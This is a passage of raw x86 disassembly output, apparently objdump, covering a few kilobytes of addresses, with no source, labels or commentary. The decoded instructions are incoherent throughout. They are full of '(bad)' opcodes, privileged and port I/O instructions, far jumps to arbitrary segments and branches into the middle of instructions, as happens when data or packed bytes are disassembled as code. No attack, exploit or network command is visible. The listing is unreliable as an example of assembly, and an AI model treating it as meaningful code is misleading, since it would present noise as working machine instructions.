  41278a:	call   0x38102a51
  41278f:	inc    edi
  412790:	iret   
  412791:	icebp  
  412792:	out    0x2f,eax
  412794:	lahf   
  412795:	xchg   edi,eax
  412796:	mov    bl,0x20
  412798:	imul   esi,DWORD PTR [edx+0x7ea0bf7f],0x20
  41279f:	cwde   
  4127a0:	mov    edi,0x53ada195
  4127a5:	ins    DWORD PTR es:[edi],dx
  4127a6:	sbb    eax,0x9cccceed
  4127ab:	(bad)  
  4127ad:	xor    bl,BYTE PTR [ecx-0x33]
  4127b0:	push   ss
  4127b1:	jnp    0x412815
  4127b3:	(bad)  
  4127b4:	idiv   ecx
  4127b6:	aad    0xe8
  4127b8:	retf   0x7c06
  4127bb:	ss lahf 
  4127bd:	push   ebx
  4127be:	xchg   BYTE PTR [esi],al
  4127c0:	cwde   
  4127c1:	in     al,0x58
  4127c3:	leave  
  4127c4:	inc    ebx
  4127c5:	adc    al,0x4d
  4127c7:	adc    DWORD PTR [ecx+0x654ef87c],eax
  4127cd:	xor    DWORD PTR [edx+esi*1],ebp
  4127d0:	push   edi
  4127d1:	pop    eax
  4127d2:	xor    al,0xb7
  4127d4:	xor    eax,0xd37b7eb0
  4127d9:	mov    eax,ds:0x363be865
  4127de:	push   0xffffff89
  4127e0:	jmp    0xc39f5cd
  4127e5:	push   edi
  4127e6:	icebp  
  4127e7:	addr16 and eax,0x326cff29
  4127ed:	mov    cl,0x8e
  4127ef:	or     DWORD PTR [edi+0x25781834],esi
  4127f5:	fxch   st(1)
  4127f7:	outs   dx,BYTE PTR ds:[esi]
  4127f8:	daa    
  4127f9:	push   esi
  4127fa:	mov    ah,BYTE PTR ds:0x6f3e2b85
  412800:	push   cs
  412801:	bound  edx,QWORD PTR [ebp+0x44c37aa9]
  412807:	mov    ah,0xd
  412809:	scas   al,BYTE PTR es:[edi]
  41280a:	inc    eax
  41280b:	das    
  41280c:	(bad)  
  41280d:	hlt    
  41280e:	les    esi,FWORD PTR [ebp+0x58]
  412811:	mov    WORD PTR [ebp-0xd80c5fe],gs
  412817:	xor    al,dh
  412819:	add    DWORD PTR [ecx-0x7d],0x3e798b35
  412820:	pcmpgtw mm3,QWORD PTR [esi+0x45]
  412824:	inc    esp
  412825:	mov    ds:0x93323548,eax
  41282a:	mov    ds:0x35ade58,eax
  41282f:	sub    al,0x3e
  412831:	fs nop
  412833:	and    eax,ebp
  412835:	icebp  
  412836:	gs xor ebx,eax
  412839:	pusha  
  41283a:	xor    al,0x27
  41283c:	mov    BYTE PTR [esi+eiz*8],bh
  41283f:	dec    edx
  412840:	sbb    dl,ah
  412842:	jg     0x412862
  412844:	cmp    al,0xf9
  412846:	data16 add al,0xe2
  412849:	int3   
  41284a:	ror    DWORD PTR [edx+0x7b9287a5],0x91
  412851:	jns    0x4128c6
  412853:	and    esi,DWORD PTR ds:[edx+0x70af8458]
  41285a:	ror    DWORD PTR [esi+esi*8],0xeb
  41285e:	test   DWORD PTR [ebx],ebp
  412860:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  412862:	dec    esi
  412863:	xor    al,0xd1
  412865:	dec    ecx
  412866:	data16 fsubr QWORD PTR [ebx+0x36d5caf2]
  41286d:	adc    eax,0x33f1cc4c
  412872:	xchg   edi,eax
  412873:	and    esp,DWORD PTR [ebx-0x66]
  412876:	and    DWORD PTR [edx+0x77],ebx
  412879:	lahf   
  41287a:	sub    al,bl
  41287c:	mov    cl,0x1d
  41287e:	loope  0x412816
  412880:	push   ds
  412881:	fwait
  412882:	jmp    0x4128d2
  412884:	outs   dx,BYTE PTR ds:[esi]
  412885:	es leave 
  412887:	iret   
  412888:	inc    ecx
  412889:	pushf  
  41288a:	inc    ebp
  41288b:	dec    ecx
  41288c:	fidiv  DWORD PTR [edi+0x3a]
  41288f:	mov    esp,0x5ee10a2f
  412894:	sbb    eax,0xfe5f7a55
  412899:	jg     0x412884
  41289b:	or     ebp,DWORD PTR [edi+0xe309e30]
  4128a1:	jne    0x41291d
  4128a3:	scas   eax,DWORD PTR es:[edi]
  4128a4:	lock loope 0x412866
  4128a7:	shl    BYTE PTR [ebx-0x56],1
  4128aa:	fidivr DWORD PTR [ebx+0x2bdb12d]
  4128b0:	xlat   BYTE PTR ds:[ebx]
  4128b1:	push   cs
  4128b2:	dec    ebx
  4128b3:	sub    DWORD PTR [ecx+eax*2],ebp
  4128b6:	pop    ds
  4128b7:	adc    al,0x5a
  4128b9:	jmp    0xbb49e02a
  4128be:	lds    edx,FWORD PTR [edx+eax*8-0x5a]
  4128c2:	ins    BYTE PTR es:[edi],dx
  4128c3:	xchg   al,cl
  4128c5:	aam    0xc8
  4128c7:	data16 in al,0xb6
  4128ca:	popa   
  4128cb:	adc    al,BYTE PTR [edx+0x3c22b61d]
  4128d1:	cmp    ch,BYTE PTR [edx]
  4128d3:	xor    BYTE PTR [ecx+0x6be70f92],bl
  4128d9:	loop   0x412913
  4128db:	rol    BYTE PTR [ebx],cl
  4128dd:	pop    edi
  4128de:	rcr    BYTE PTR [eax-0x19],cl
  4128e1:	stos   DWORD PTR es:[edi],eax
  4128e2:	mov    ecx,0xb873935f
  4128e7:	sbb    BYTE PTR [ebp+0x4a],0x9
  4128eb:	jnp    0x412966
  4128ed:	nop
  4128ee:	ret    
  4128ef:	ret    0x15af
  4128f2:	dec    esi
  4128f3:	jnp    0x4128c1
  4128f5:	ja     0x4128cb
  4128f7:	mov    eax,ds:0x2315493e
  4128fc:	mov    ebx,0x7719211f
  412901:	fidiv  DWORD PTR [ecx]
  412903:	int3   
  412904:	sub    eax,0xb6b94598
  412909:	dec    edx
  41290a:	es pop ebx
  41290c:	pop    ebp
  41290d:	sbb    BYTE PTR [edx],al
  41290f:	outs   dx,DWORD PTR ds:[esi]
  412910:	push   edi
  412911:	xchg   DWORD PTR [ebp+0x7719da1b],ecx
  412917:	and    al,0xdf
  412919:	inc    eax
  41291a:	dec    edi
  41291b:	test   BYTE PTR [esi],0xb9
  41291e:	jp     0x412945
  412920:	clc    
  412921:	pop    eax
  412922:	pop    ebx
  412923:	scas   eax,DWORD PTR es:[edi]
  412924:	fcmovbe st,st(7)
  412926:	and    esp,DWORD PTR [edx-0x374e4f95]
  41292c:	mov    ebx,0xd79e69f1
  412931:	push   edx
  412932:	(bad)  
  412933:	dec    esi
  412934:	inc    ebp
  412935:	xchg   BYTE PTR [eax],bl
  412937:	add    bl,0x33
  41293a:	pop    es
  41293b:	lahf   
  41293c:	jp     0x41291f
  41293e:	xchg   edi,eax
  41293f:	cmp    cl,bh
  412941:	sbb    ebp,DWORD PTR [esi+ebx*1+0x592cd29]
  412948:	imul   ecx,DWORD PTR [eax-0x65],0x29
  41294c:	xchg   edi,eax
  41294d:	add    BYTE PTR [ebx-0x41d7449f],al
  412953:	stos   BYTE PTR es:[edi],al
  412954:	jg     0x412923
  412956:	adc    BYTE PTR [edi],0xff
  412959:	pop    ebx
  41295a:	xor    eax,0x7fdbfbe2
  41295f:	xor    dl,BYTE PTR [eax-0x7d426a04]
  412965:	inc    edx
  412966:	stos   BYTE PTR es:[edi],al
  412967:	leave  
  412968:	aaa    
  412969:	shr    BYTE PTR [edx+eax*8+0x4b],1
  41296d:	jbe    0x41294b
  41296f:	pusha  
  412970:	mov    ds:0x7bfcc0f2,al
  412975:	loope  0x4129bc
  412977:	mov    edi,DWORD PTR [edi+0x75421ec]
  41297d:	enter  0xc593,0x2
  412981:	adc    eax,0x8068097d
  412986:	adc    al,0x17
  412988:	imul   esp,DWORD PTR [ecx+esi*1+0x39],0xffffffe7
  41298d:	dec    edx
  41298e:	dec    ebp
  41298f:	mov    eax,ds:0xb8a9e152
  412994:	mov    esi,0x97a016aa
  412999:	and    ebx,DWORD PTR ss:[edi]
  41299c:	pop    esi
  41299d:	(bad)  
  41299e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41299f:	scas   eax,DWORD PTR es:[edi]
  4129a0:	div    dl
  4129a2:	xor    al,0x81
  4129a4:	ja     0x41293e
  4129a6:	mov    ch,0xc
  4129a8:	pop    ecx
  4129a9:	pop    ecx
  4129aa:	fisub  DWORD PTR [ebx]
  4129ac:	pop    ebx
  4129ad:	sbb    eax,0x8aba770
  4129b2:	dec    ebp
  4129b3:	(bad)  
  4129b4:	stc    
  4129b5:	int3   
  4129b6:	inc    esi
  4129b7:	cs pop ecx
  4129b9:	xchg   esp,eax
  4129ba:	inc    edi
  4129bb:	or     ebp,DWORD PTR ds:0xda019626
  4129c1:	sar    ebx,cl
  4129c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129c4:	mov    bh,0xb8
  4129c6:	shl    ah,cl
  4129c8:	xor    BYTE PTR [esi+0x25],al
  4129cb:	xchg   edi,eax
  4129cc:	and    DWORD PTR [eax+eax*4-0xe2c240e],0xffffffb9
  4129d4:	out    dx,al
  4129d5:	aaa    
  4129d6:	add    edi,esi
  4129d8:	jnp    0x412988
  4129da:	shl    DWORD PTR [esi-0x6687c47e],0x74
  4129e1:	dec    edi
  4129e2:	scas   al,BYTE PTR es:[edi]
  4129e3:	in     eax,0xd4
  4129e5:	adc    DWORD PTR [ebx],esi
  4129e7:	ss mov al,0xef
  4129ea:	inc    esi
  4129eb:	push   cs
  4129ec:	xchg   ebp,eax
  4129ed:	jne    0x412a6a
  4129ef:	xchg   eax,ecx
  4129f1:	jmp    0xf3938b5a
  4129f6:	jg     0x412990
  4129f8:	pop    edi
  4129f9:	jae    0x4129a8
  4129fb:	iret   
  4129fc:	inc    esi
  4129fd:	scas   eax,DWORD PTR es:[edi]
  4129fe:	dec    ebp
  4129ff:	aam    0x92
  412a01:	jnp    0x4129ba
  412a03:	pusha  
  412a04:	pop    esi
  412a05:	js     0x412a45
  412a07:	add    dl,BYTE PTR [edi]
  412a09:	cld    
  412a0a:	adc    eax,0xa130e530
  412a0f:	fistp  WORD PTR [ebx+0x6b]
  412a12:	inc    ebx
  412a13:	xor    BYTE PTR [edx+0x5f10cf1e],0xa8
  412a1a:	aaa    
  412a1b:	cmp    BYTE PTR [edx+0x502f8556],ch
  412a21:	jns    0x412a33
  412a23:	xchg   ecx,eax
  412a24:	or     dl,BYTE PTR [ecx-0x2efcb9]
  412a2a:	pop    eax
  412a2b:	es jne 0x412a06
  412a2e:	sbb    ecx,DWORD PTR [ecx+0x614e7065]
  412a34:	or     BYTE PTR [ebp-0x5438a226],bh
  412a3a:	icebp  
  412a3b:	mov    dh,0xa4
  412a3d:	push   esp
  412a3e:	jae    0x412a4a
  412a40:	push   edi
  412a41:	(bad)  
  412a42:	xor    BYTE PTR [edx],dh
  412a44:	mov    ebx,0xd934dcf5
  412a49:	icebp  
  412a4a:	(bad)
  412a4d:	inc    ecx
  412a4e:	add    DWORD PTR [esi-0xb9a744a],edx
  412a54:	cmp    eax,0x7e38d5b0
  412a59:	pusha  
  412a5a:	lock mov DWORD PTR [ebp+0x5d],esp
  412a5e:	cmp    esp,DWORD PTR [edx+0x647eb2dd]
  412a64:	test   al,0x50
  412a66:	pop    esp
  412a67:	std    
  412a68:	nop
  412a69:	xor    BYTE PTR [edi+0x9],dl
  412a6c:	mov    al,ds:0x63e907f0
  412a71:	and    ebx,esp
  412a73:	adc    ebp,ecx
  412a75:	inc    ebx
  412a76:	inc    eax
  412a77:	scas   eax,DWORD PTR es:[edi]
  412a78:	mov    WORD PTR [ebx+0x42b89d07],fs
  412a7e:	cmp    DWORD PTR [edx+ebp*2+0x55],0xc6b11d3b
  412a86:	xor    eax,0xa64ca3c1
  412a8b:	and    edi,DWORD PTR [ecx-0x36]
  412a8e:	jnp    0x412afa
  412a90:	jp     0x412a2d
  412a92:	mov    eax,DWORD PTR [ecx]
  412a94:	cmp    al,0xae
  412a96:	(bad)  
  412a97:	sbb    eax,0xafd00455
  412a9c:	push   es
  412a9d:	mov    ebp,0x1f1c49ed
  412aa2:	int    0x8d
  412aa4:	jbe    0x412aac
  412aa6:	xchg   ebx,eax
  412aa7:	test   al,0x27
  412aa9:	and    DWORD PTR [esi],0xfffffff8
  412aac:	sub    esp,ebp
  412aae:	loop   0x412b24
  412ab0:	xchg   esi,eax
  412ab1:	cmc    
  412ab2:	xchg   BYTE PTR [edx+0x75],bh
  412ab5:	jae    0x412b36
  412ab7:	icebp  
  412ab8:	in     eax,dx
  412ab9:	(bad)  
  412aba:	ja     0x412b29
  412abc:	js     0x412a64
  412abe:	std    
  412abf:	popa   
  412ac0:	je     0x412aaa
  412ac2:	(bad)  
  412ac3:	or     al,0xb7
  412ac5:	enter  0x6ee,0x41
  412ac9:	or     cl,ch
  412acb:	popa   
  412acc:	sti    
  412acd:	ins    DWORD PTR es:[edi],dx
  412ace:	mov    esi,0xe41db192
  412ad3:	dec    edi
  412ad4:	fcmovnb st,st(1)
  412ad6:	loopne 0x412ac0
  412ad8:	jecxz  0x412a5e
  412ada:	mov    ecx,0x10231bf8
  412adf:	or     ah,ch
  412ae1:	retf   
  412ae2:	mov    ds:0xb72f6ca9,al
  412ae7:	xchg   esi,eax
  412ae8:	scas   eax,DWORD PTR es:[edi]
  412ae9:	xchg   esp,eax
  412aea:	inc    esp
  412aeb:	sahf   
  412aec:	lods   al,BYTE PTR ds:[esi]
  412aed:	ds aas 
  412aef:	mov    ebx,0xb4a8399c
  412af4:	cdq    
  412af5:	cmc    
  412af6:	popf   
  412af7:	mov    al,ds:0xbcc9cf37
  412afc:	(bad)  
  412afd:	jl     0x412a92
  412aff:	icebp  
  412b00:	mov    ecx,0xc5b4ca9c
  412b05:	inc    ebx
  412b06:	icebp  
  412b07:	lods   eax,DWORD PTR ds:[esi]
  412b08:	pop    edx
  412b09:	cmc    
  412b0a:	hlt    
  412b0b:	mov    eax,ds:0x8d88da73
  412b10:	adc    dh,bl
  412b12:	retf   
  412b13:	cwde   
  412b14:	jbe    0x412b56
  412b16:	shl    DWORD PTR [ecx-0x7fa91575],cl
  412b1c:	mov    dh,0x61
  412b1e:	int    0xfc
  412b20:	inc    esp
  412b21:	jp     0x412b6f
  412b23:	adc    ecx,DWORD PTR [eax+0x33]
  412b26:	sub    BYTE PTR [esi],bh
  412b28:	push   edi
  412b29:	idiv   edi
  412b2b:	enter  0xc4c0,0xd7
  412b2f:	sub    dl,0x6b
  412b32:	les    ebx,FWORD PTR [eax-0x57]
  412b35:	fsubr  QWORD PTR [esp+edi*4-0x573c3f34]
  412b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b3d:	(bad)  
  412b3e:	aam    0xe7
  412b40:	inc    ebp
  412b41:	push   esi
  412b42:	addr16 mov ebx,?
  412b45:	or     ah,dl
  412b47:	and    ah,cl
  412b49:	inc    edi
  412b4a:	jns    0x412b19
  412b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b4d:	lock dec esp
  412b4f:	mov    esp,0xc1255530
  412b54:	mov    ds:0xeaefb2a6,eax
  412b59:	fs push 0x95b7171a
  412b5f:	mov    ah,0xe
  412b61:	lods   eax,DWORD PTR ds:[esi]
  412b62:	or     DWORD PTR [ebx+0x1de30144],ebx
  412b68:	mov    ah,0x57
  412b6a:	loope  0x412b85
  412b6c:	aad    0x23
  412b6e:	call   FWORD PTR [esi]
  412b70:	push   es
  412b71:	sub    dl,BYTE PTR [edi-0x260b5a77]
  412b77:	mov    BYTE PTR [esi],ah
  412b79:	jg     0x412bcb
  412b7b:	sub    ebp,DWORD PTR [esi+0x3d]
  412b7e:	pop    ecx
  412b7f:	mov    al,0xba
  412b81:	icebp  
  412b82:	imul   esi,DWORD PTR [ebp+ecx*8+0x41d9769],0xf6a32477
  412b8d:	out    dx,al
  412b8e:	(bad)  
  412b8f:	sar    BYTE PTR [edx],cl
  412b91:	and    BYTE PTR [ebx],dh
  412b93:	fld    TBYTE PTR fs:[ebx-0x441562bb]
  412b9a:	push   0xffffff86
  412b9c:	nop
  412b9d:	adc    al,0x76
  412b9f:	es pop esi
  412ba1:	add    DWORD PTR [esi-0x279d082e],0x134d02b
  412bab:	mov    esi,0xfb4267b0
  412bb0:	jmp    0x77a:0x2696aa0b
  412bb7:	out    dx,al
  412bb8:	jmp    0x65af:0x60179e18
  412bbf:	in     al,dx
  412bc0:	or     ah,dh
  412bc2:	div    DWORD PTR [esi-0x5c]
  412bc5:	pop    esp
  412bc6:	icebp  
  412bc7:	push   0xcc219e0b
  412bcc:	rol    DWORD PTR [ebp+0x531353b7],cl
  412bd2:	std    
  412bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd4:	mov    ch,0x6e
  412bd6:	pop    edx
  412bd7:	jb     0x412c34
  412bd9:	rcl    DWORD PTR [ebx],0xe8
  412bdc:	jno    0x412c2a
  412bde:	daa    
  412bdf:	arpl   WORD PTR [edx-0x1c],ax
  412be2:	sbb    ch,BYTE PTR [ecx]
  412be4:	mul    DWORD PTR [edi+0x241300ba]
  412bea:	dec    ebx
  412beb:	pop    edi
  412bec:	addr16 ret 0xe342
  412bf0:	aaa    
  412bf1:	out    dx,al
  412bf2:	scas   eax,DWORD PTR es:[edi]
  412bf3:	jae    0x412b88
  412bf5:	cmp    al,0x5b
  412bf7:	lds    edx,FWORD PTR [edx+0x2a70a720]
  412bfd:	(bad)  
  412bfe:	ins    BYTE PTR es:[edi],dx
  412bff:	or     eax,0x7e08e2d2
  412c04:	adc    esp,DWORD PTR [esp+ecx*4-0x5c40325b]
  412c0b:	ret    0x934c
  412c0e:	fmul   st(0),st
  412c10:	lahf   
  412c11:	jbe    0x412c6d
  412c13:	call   0x4b45:0x78bfbc91
  412c1a:	and    bh,bh
  412c1c:	mov    al,0xc
  412c1e:	pop    edx
  412c1f:	jg     0x412c62
  412c21:	cmp    DWORD PTR [eax],edx
  412c23:	and    DWORD PTR [esi],edi
  412c25:	pop    edi
  412c26:	xchg   ecx,eax
  412c27:	cli    
  412c28:	inc    eax
  412c29:	mov    ds:0x5d4e4600,eax
  412c2e:	adc    al,0x64
  412c30:	mov    ah,0xec
  412c32:	jle    0x412c30
  412c34:	xor    al,0x16
  412c36:	fsub   QWORD PTR [edx+0x59]
  412c39:	scas   al,BYTE PTR es:[edi]
  412c3a:	cmp    eax,0x7e7acd5c
  412c3f:	xchg   esi,eax
  412c40:	sub    al,0x97
  412c42:	hlt    
  412c43:	repnz xor BYTE PTR [esi],bh
  412c46:	fcomp  DWORD PTR [ebx]
  412c48:	xchg   BYTE PTR [ebp-0x4703dd16],ah
  412c4e:	dec    eax
  412c4f:	pop    edx
  412c50:	sub    al,BYTE PTR [esi-0x18]
  412c53:	jmp    0x412be1
  412c55:	mov    edx,0x7a0b9ea4
  412c5a:	(bad)  
  412c5b:	pusha  
  412c5c:	dec    edx
  412c5d:	push   0x1f
  412c5f:	ss push ss
  412c61:	sahf   
  412c62:	addr16 dec esp
  412c64:	xor    eax,0xeeed564a
  412c69:	xor    edx,DWORD PTR [esi+0x2f2073a]
  412c6f:	dec    ebp
  412c70:	add    eax,0xdff829c3
  412c75:	retf   
  412c76:	add    BYTE PTR [ebx+ebx*8+0x1bee2c07],al
  412c7d:	ins    BYTE PTR es:[edi],dx
  412c7e:	inc    ecx
  412c7f:	xchg   ebx,eax
  412c80:	std    
  412c81:	cmp    eax,0x6dae5198
  412c86:	addr16 jmp 0x412ccb
  412c89:	jg     0x412c38
  412c8b:	das    
  412c8c:	xchg   esi,eax
  412c8d:	push   0xfffffff5
  412c8f:	jae    0x412c18
  412c91:	call   0x6767:0x3cc8b08
  412c98:	cld    
  412c99:	push   edx
  412c9a:	shr    BYTE PTR [edx-0x6f9ee954],cl
  412ca0:	stos   BYTE PTR es:[edi],al
  412ca1:	not    DWORD PTR [edi]
  412ca3:	int    0x11
  412ca5:	data16 adc ch,BYTE PTR [edx+0x6e]
  412ca9:	jmp    0xb6c8:0x17dd42ac
  412cb0:	in     al,dx
  412cb1:	push   ecx
  412cb2:	mov    BYTE PTR [eax+0x74],dh
  412cb5:	shr    DWORD PTR [edx+0x1e],cl
  412cb8:	adc    BYTE PTR [eax-0x60],0x65
  412cbc:	in     al,dx
  412cbd:	and    dh,dl
  412cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cc0:	fidiv  DWORD PTR [edx]
  412cc2:	jno    0x412c5a
  412cc4:	pop    ebp
  412cc5:	repnz dec esp
  412cc7:	mov    al,0xb3
  412cc9:	sbb    eax,0x1108819d
  412cce:	push   eax
  412ccf:	push   ss
  412cd0:	addr16 dec ebp
  412cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cd3:	ja     0x412c8d
  412cd5:	adc    cl,BYTE PTR [edx-0x5e25785d]
  412cdb:	push   0x7
  412cdd:	sbb    ecx,esi
  412cdf:	in     eax,dx
  412ce0:	fs scas eax,DWORD PTR es:[edi]
  412ce2:	cs mov esp,0x34c33511
  412ce8:	popf   
  412ce9:	lock fwait
  412ceb:	adc    al,0xdb
  412ced:	test   DWORD PTR [ebx],esp
  412cef:	imul   ebp,DWORD PTR [edi+0x53],0x171cae41
  412cf6:	and    ecx,0x349da903
  412cfc:	scas   al,BYTE PTR es:[edi]
  412cfd:	mov    esp,0x4bc5aee4
  412d02:	call   0x6804:0xc8a61bae
  412d09:	lods   al,BYTE PTR ds:[esi]
  412d0a:	push   ds
  412d0b:	pop    ecx
  412d0c:	jl     0x412d22
  412d0e:	dec    edx
  412d10:	jbe    0x412d3f
  412d12:	pop    ebp
  412d13:	bnd jmp 0x412ced
  412d16:	and    al,0x10
  412d18:	mov    ebx,0xc46753bb
  412d1d:	out    0x24,al
  412d1f:	(bad)  
  412d20:	cmc    
  412d21:	pop    ebp
  412d22:	mov    esp,0x9eba8b25
  412d27:	xchg   esp,eax
  412d28:	js     0x412d8b
  412d2a:	jno    0x412d36
  412d2c:	mov    BYTE PTR [ebx-0x51],0xa
  412d30:	cmp    DWORD PTR fs:[eax],esp
  412d33:	popa   
  412d34:	retf   0xbb2
  412d37:	xor    BYTE PTR [ecx+0x2c],bl
  412d3a:	push   eax
  412d3b:	pushf  
  412d3c:	mov    al,0x7b
  412d3e:	ja     0x412d25
  412d40:	(bad)  
  412d41:	sub    ch,BYTE PTR [edi+0xf]
  412d44:	fcom   DWORD PTR ds:0x8841e961
  412d4a:	add    al,dl
  412d4c:	pop    edx
  412d4d:	mov    bh,0xcd
  412d4f:	fdivr  QWORD PTR [ebx+ebx*8]
  412d52:	adc    DWORD PTR [edi],ecx
  412d54:	loope  0x412d0b
  412d56:	and    bl,BYTE PTR [esi-0x64c988a8]
  412d5c:	scas   eax,DWORD PTR es:[edi]
  412d5d:	xor    al,0xb8
  412d5f:	les    ebx,FWORD PTR [eax+0x48]
  412d62:	out    0x73,eax
  412d64:	shr    DWORD PTR ds:0x9115bede,0x47
  412d6b:	add    edx,DWORD PTR [ebp-0x2]
  412d6e:	(bad)  
  412d6f:	fistp  DWORD PTR [ebx+0x7b]
  412d72:	or     al,0x86
  412d74:	leave  
  412d75:	pop    esp
  412d76:	xchg   edx,eax
  412d77:	inc    DWORD PTR [esi]
  412d79:	push   esp
  412d7a:	(bad)  
  412d7b:	popf   
  412d7c:	lods   al,BYTE PTR ds:[esi]
  412d7d:	mov    cl,0x37
  412d7f:	jmp    0x2f691d17
  412d84:	bnd jmp 0x54327516
  412d8a:	jmp    0xd909d3ff
  412d8f:	pushf  
  412d90:	rol    DWORD PTR [eax],cl
  412d92:	cmp    al,0xcd
  412d94:	cmp    esi,DWORD PTR es:[edx-0x31]
  412d98:	inc    edi
  412d99:	and    eax,0x2dbc61bc
  412d9e:	mov    ah,0x2c
  412da0:	or     bh,al
  412da2:	mov    ebp,cs
  412da4:	jno    0x412e06
  412da6:	fadd   DWORD PTR [ebp+ecx*8+0x28e6bf32]
  412dad:	aad    0xb0
  412daf:	sub    esi,0x35
  412db2:	loop   0x412d9e
  412db4:	lahf   
  412db5:	mov    ebp,0x2af77e3c
  412dba:	cmp    eax,0x84cebdc6
  412dbf:	and    al,ah
  412dc1:	xchg   esp,eax
  412dc2:	jl     0x412d99
  412dc4:	loopne 0x412da0
  412dc6:	adc    eax,DWORD PTR [eax-0x6ec2859e]
  412dcc:	jbe    0x412dae
  412dce:	xor    al,0x4f
  412dd0:	fsub   QWORD PTR [esi+eiz*1-0x7f32130c]
  412dd7:	mov    ch,BYTE PTR [ebx-0x15c783c9]
  412ddd:	sbb    BYTE PTR [ebx+0xf1c0312],ah
  412de3:	arpl   WORD PTR [edx],dx
  412de5:	pop    ebp
  412de6:	sbb    BYTE PTR [ebx],cl
  412de8:	add    esp,DWORD PTR ds:[ebx-0x4d]
  412dec:	dec    eax
  412ded:	inc    edi
  412dee:	pop    eax
  412def:	adc    DWORD PTR [edi-0x6847cae9],esi
  412df5:	pusha  
  412df6:	pop    es
  412df7:	or     eax,DWORD PTR [edi+0x2d989652]
  412dfd:	xchg   DWORD PTR [eax],ecx
  412dff:	std    
  412e00:	ins    BYTE PTR es:[edi],dx
  412e01:	push   eax
  412e02:	outs   dx,DWORD PTR ds:[esi]
  412e03:	adc    al,0xc7
  412e05:	rcr    DWORD PTR [ebp-0x6917f909],1
  412e0b:	fld    QWORD PTR [ebx-0x6dbfee1d]
  412e11:	call   0xd818e9cd
  412e16:	xchg   DWORD PTR [esi-0x6ef9f35c],edx
  412e1c:	retf   
  412e1d:	jmp    0x412de5
  412e1f:	ins    BYTE PTR es:[edi],dx
  412e20:	je     0x412df0
  412e22:	cdq    
  412e23:	mov    edx,0xfa62e92
  412e28:	mov    es,WORD PTR [edi+0x40]
  412e2b:	xor    BYTE PTR [ebp-0x45],cl
  412e2e:	ret    
  412e2f:	mov    bl,0x76
  412e31:	push   es
  412e32:	jg     0x412e6c
  412e34:	cli    
  412e35:	cmp    dh,BYTE PTR [ecx-0x37ab6703]
  412e3b:	rol    DWORD PTR [esi+ebp*4+0x44],cl
  412e3f:	xchg   ebx,eax
  412e40:	sbb    edi,DWORD PTR [ecx]
  412e42:	fimul  WORD PTR [eax+edx*1]
  412e45:	push   ebx
  412e46:	aad    0xc6
  412e48:	or     eax,0xf3f7cfba
  412e4d:	cmp    eax,0x5af5960b
  412e52:	imul   esp,DWORD PTR [ecx],0xbfb65593
  412e58:	loop   0x412df4
  412e5a:	int3   
  412e5b:	push   ss
  412e5c:	stos   BYTE PTR es:[edi],al
  412e5d:	mov    cl,0x24
  412e5f:	iret   
  412e60:	in     al,0xac
  412e62:	stc    
  412e63:	push   edi
  412e64:	std    
  412e65:	and    al,0x37
  412e67:	or     esp,edx
  412e69:	sub    eax,DWORD PTR [eax]
  412e6b:	dec    edi
  412e6c:	mov    edx,esp
  412e6e:	test   dh,ch
  412e70:	mov    al,BYTE PTR gs:[eax-0x6818b874]
  412e77:	outs   dx,DWORD PTR ds:[esi]
  412e78:	(bad)  
  412e79:	ret    0x9a2c
  412e7c:	xchg   edi,eax
  412e7d:	sti    
  412e7e:	icebp  
  412e7f:	dec    ecx
  412e80:	cdq    
  412e81:	adc    BYTE PTR [esi+eiz*2+0x8],ch
  412e85:	mov    dh,0x55
  412e87:	pop    ebx
  412e88:	add    BYTE PTR [edi],dh
  412e8a:	sbb    eax,DWORD PTR [ebx+0x34e13e7c]
  412e90:	push   ecx
  412e91:	and    al,0x81
  412e93:	xchg   ebp,eax
  412e94:	or     al,0xa
  412e96:	stos   BYTE PTR es:[edi],al
  412e97:	(bad)  
  412e98:	ds enter 0xc249,0x38
  412e9d:	cdq    
  412e9e:	fiadd  WORD PTR [edx-0x49]
  412ea1:	mov    esi,0x744bdcc5
  412ea6:	arpl   WORD PTR [ecx+0x4e],dx
  412ea9:	ret    0xd38c
  412eac:	ret    
  412ead:	push   esp
  412eae:	cmp    DWORD PTR [ebx],ecx
  412eb0:	icebp  
  412eb1:	repnz ds leave 
  412eb4:	sub    DWORD PTR [edi-0x6ed31b29],eax
  412eba:	mov    eax,ds:0xbd092b28
  412ebf:	or     esi,DWORD PTR [edi]
  412ec1:	dec    ebp
  412ec2:	add    eax,0x151211ca
  412ec7:	pop    ebx
  412ec8:	out    dx,eax
  412ec9:	and    ebx,DWORD PTR [esi+0x3cbdcf4a]
  412ecf:	mov    dh,0xa8
  412ed1:	mov    esi,esp
  412ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ed4:	push   ds
  412ed5:	stos   BYTE PTR es:[edi],al
  412ed6:	push   esp
  412ed7:	add    eax,0x1cbd7a45
  412edc:	in     al,dx
  412edd:	xchg   ebp,eax
  412ede:	aam    0xee
  412ee0:	mov    ah,0x80
  412ee2:	jecxz  0x412e69
  412ee4:	mov    ebp,0x71e00d8
  412ee9:	sti    
  412eea:	mov    bl,0x3e
  412eec:	daa    
  412eed:	sub    eax,0xc7f68e40
  412ef2:	adc    BYTE PTR [edx+0x1b41d6d7],bl
  412ef8:	test   eax,0x3bcbaaf0
  412efd:	xchg   ah,bh
  412eff:	sbb    eax,0xde4bd1fc
  412f04:	mov    esp,0x8f97fbf
  412f09:	cwde   
  412f0a:	lahf   
  412f0b:	mov    ebx,0x9bf9caff
  412f10:	fwait
  412f11:	mov    cl,0xcb
  412f13:	and    al,BYTE PTR [eax+edx*4+0x28]
  412f17:	jp     0x412f49
  412f19:	mov    al,BYTE PTR [eax]
  412f1b:	data16 jp 0x412f86
  412f1e:	push   edx
  412f1f:	icebp  
  412f20:	aas    
  412f21:	pop    ebx
  412f22:	aas    
  412f23:	pop    edi
  412f24:	je     0x412f6f
  412f26:	jecxz  0x412f73
  412f28:	adc    BYTE PTR [edx],0x4b
  412f2b:	repnz mov ecx,0x4a1b79
  412f31:	mov    dl,bh
  412f33:	ret    
  412f34:	push   0xffffffd1
  412f36:	mov    ecx,0x749355d9
  412f3b:	push   edx
  412f3c:	or     esp,ecx
